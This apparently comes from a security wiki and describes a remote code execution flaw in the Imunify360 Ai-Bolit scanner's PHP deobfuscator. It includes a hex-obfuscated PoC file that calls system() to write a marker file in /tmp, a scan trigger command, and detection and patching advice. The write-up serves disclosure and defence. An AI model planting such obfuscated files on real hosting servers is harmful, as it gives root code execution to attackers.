# Imunify360 Ai-Bolit deobfuscation RCE (abusing AV/scanner deobfuscators)

{{#include ../../banners/hacktricks-training.md}}

Abuse pattern: a malware scanner/deobfuscator dynamically resolves function names from untrusted files and executes them (e.g., via call_user_func_array). If the resolved name is a sink such as system/exec/shell_exec/passthru/eval/assert, the scanner runs attacker-controlled code under its own privileges (often root).

This page documents an instance affecting Imunify360 AV (Ai‑Bolit) prior to v32.7.4.0 and generalizes the technique.

## Affected scenario (Ai‑Bolit)

- Component: Imunify360 AV (Ai‑Bolit) PHP deobfuscation engine
- Versions: < v32.7.4.0
- Privilege: Scanner typically runs as root on hosting servers
- Root cause: Deobfuscation pipeline recovers function names/args from untrusted PHP and executes them without an allow-list

Key internals observed:
- A helper (e.g., Helpers::executeWrapper) wraps call_user_func_array() and returns the function result.
- Multiple deobfuscation flows feed attacker-influenced function names into that wrapper without validation.

Two exploitable flows seen in practice:
- Eval-hex function pattern: function names/arguments are hex-escaped and then executed.
- Delta/Ord chain: a routine (e.g., deobfuscateDeltaOrd) builds a list of function names from content and applies them sequentially via the wrapper; if the list contains a sink, it gets invoked during “deobfuscation”.

## Why it triggers in production

- The CLI default disables deep deobfuscation unless -y/--deobfuscate is passed:
```php
if (!defined('AI_DEOBFUSCATE')) {
    define('AI_DEOBFUSCATE', false);
}
...
if (isset($options['deobfuscate']) || isset($options['y'])) {
    define('AI_DEOBFUSCATE', true);
}
```
- Imunify360’s orchestrator always enables it by passing --deobfuscate to the Ai‑Bolit wrapper for all scan types (background, on‑demand, user‑initiated):
```python
cmd = [
    "/opt/ai-bolit/wrapper",
    AIBOLIT_PATH,
    "--smart",
    "--deobfuscate",  # ALWAYS ENABLED
    "--avdb", MalwareSignatures.AI_BOLIT_HOSTER,
    "--no-html",
    "--memory", get_memory(intensity_ram),
]
```
Result: simply dropping a malicious file in a scanned path can trigger RCE during routine scans.

## Exploitation

Preconditions
- Ai‑Bolit is installed and scanning a path you can write to (e.g., shared hosting webroot)
- Orchestrator invokes Ai‑Bolit with --deobfuscate (default in Imunify360)

Steps
1) Place an obfuscated PHP that resolves to a sink and arguments the engine will decode and invoke.
2) Wait for a scan (scheduled/on‑demand) or trigger one.
3) The deobfuscator resolves names/args and executes the sink via call_user_func_array() under scanner privileges.

PoC (writes /tmp/l33t.txt)
```php
<?php
$data = "test";

$payload = "\x73\x79\x73\x74\x65\x6d"("\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x33\x33\x74\x2e\x74\x78\x74\x20\x26\x26\x20\x65\x63\x68\x6f\x20\x22\x44\x45\x46\x2d\x33\x36\x37\x38\x39\x22\x20\x3e\x20\x2f\x74\x6d\x70\x2f\x6c\x33\x33\x74\x2e\x74\x78\x74");
// eval(pack(...)) style flows are executed by the deobfuscator
// Common decoding stages: hex, pack(), base64_decode(), gzinflate(), delta/ord transforms

eval("\x70\x61\x63\x6b"($payload));
?>
```

Manual triage/trigger (if running Ai‑Bolit standalone during analysis)
```bash
php ai-bolit.php -y -j poc.php
```

Notes
- Sinks commonly reachable via this design: system, exec, shell_exec, passthru, eval, assert
- Payloads often include safe-looking transforms (hex/base64/gzinflate/str_rot13/strrev/pack/urldecode) and then terminate in a sink

## Detection and triage

- Process lineage during scan windows: look for ai-bolit/wrapper spawning shells or commands
```bash
ps aux | grep -E "ai-bolit|--deobfuscate"
```
- Unexpected artifacts written by scans: files in /tmp or webroots created around scan times (e.g., /tmp/l33t.txt)
- Network egress from scanner processes (if payloads exfiltrate)
- Review orchestrator configs to confirm --deobfuscate is forced

## Hardening and remediation

- Update to v32.7.4.0+ (patch enforces allow-listing of deterministic, pure decoding helpers)
- Never execute attacker-influenced function names; enforce a strict allow-list:
```php
public static function isSafeFunc($func) {
    $safeFuncs = [
        'base64_decode','gzinflate','strrev','str_rot13','urldecode','substr','chr','ord',
    ];
    return in_array(strtolower($func), $safeFuncs, true);
}
```
- Run deobfuscators/scanners in least-privileged sandboxes/containers with no outbound network and minimal FS access
- If immediate patching is not possible, temporarily disable or remove the vulnerable component and/or isolate it

## Generalizing the technique: abusing deobfuscators

- Dynamic function invocation anti-pattern: Any analysis pipeline that “applies recovered function names” to untrusted data must validate the function set against a known-safe allow-list and treat everything else as data
- Function-sequence chaining: If a pipeline accepts a list of functions extracted from content and applies them in order, controlling that list → terminal sink execution
- Orchestrator mismatch: Even if CLI defaults are safe, production wrappers may force deep deobfuscation; test the real invocation path

## Version status

- Affected: Imunify360 AV (Ai‑Bolit) < v32.7.4.0
- Fixed: v32.7.4.0 (and subsequent backports) – disallow execution of unsafelist functions recovered from arbitrary files

## References

- [Patchstack – Critical: Remote Code Execution via Malicious Obfuscated Malware in Imunify360 AV (AI-bolit)](https://patchstack.com/articles/remote-code-execution-vulnerability-found-in-imunify360/)
- [CloudLinux notice – Ai-Bolit security vulnerability before v32.7.4.0](https://cloudlinux.zendesk.com/hc/en-us/articles/23364954576540-Ai-Bolit-security-vulnerability-before-v32-7-4-0)
- [Imunify changelog (DEF-36789)](https://changelog.imunify.com/imunify-av)

{{#include ../../banners/hacktricks-training.md}}
